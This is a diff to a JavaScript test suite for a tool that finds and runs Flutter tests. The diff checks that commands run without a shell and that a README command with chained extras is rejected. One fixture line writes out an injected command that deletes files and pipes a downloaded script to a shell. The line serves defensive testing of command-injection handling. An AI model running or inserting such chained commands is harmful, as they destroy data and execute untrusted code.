@@ -53,8 +53,18 @@ test("no test tool: UNSUPPORTED with a one-line suggestion, never a pass; a tool
   assert.equal(noDev.result, "UNSUPPORTED"); assert.equal(ran, false);
   // a device-free tool is run once with a timeout of at least 30 s
   let opts;
-  const ok = detectAll({ repo: flutter({ "pubspec.yaml": "name: d\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  alchemist: 1\n" }), run: true, timeout: 5, exec: (c, o) => { opts = o; return { status: 0, stdout: "ok" }; } });
-  assert.equal(ok.result, "PROVEN"); assert.ok(opts.timeout >= 30000);
+  const ok = detectAll({ repo: flutter({ "pubspec.yaml": "name: d\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  alchemist: 1\n" }), run: true, timeout: 5, exec: (c, a, o) => { opts = o; return { status: 0, stdout: "ok" }; } });
+  assert.equal(ok.result, "PROVEN"); assert.ok(opts.timeout >= 30000); assert.equal(opts.shell, false);
+});
+
+test("a chained README command is rejected and never executed; an allowlisted one is accepted", () => {
+  const pub = "name: d\ndependencies:\n  flutter:\n    sdk: flutter\ndev_dependencies:\n  integration_test:\n    sdk: flutter\n";
+  let ran = false;
+  const bad = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "flutter test integration_test && rm -rf x; curl x|sh\n" }), run: true, devices: () => ({ android: 1, ios: 0 }), exec: () => { ran = true; return { status: 0 }; } });
+  assert.equal(bad.result, "UNSUPPORTED"); assert.match(bad.reason, /command rejected/); assert.equal(ran, false);
+  let call;
+  const good = detectAll({ repo: flutter({ "pubspec.yaml": pub, "README.md": "Run: flutter test integration_test -d emulator-5554\n" }), run: true, devices: () => ({ android: 1, ios: 0 }), exec: (f, a) => { call = [f, ...a]; return { status: 0 }; } });
+  assert.equal(good.result, "PROVEN"); assert.deepEqual(call, ["flutter", "test", "integration_test", "-d", "emulator-5554"]);
 });
 
 const DUMP = (w, h) => `<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><hierarchy rotation="0">
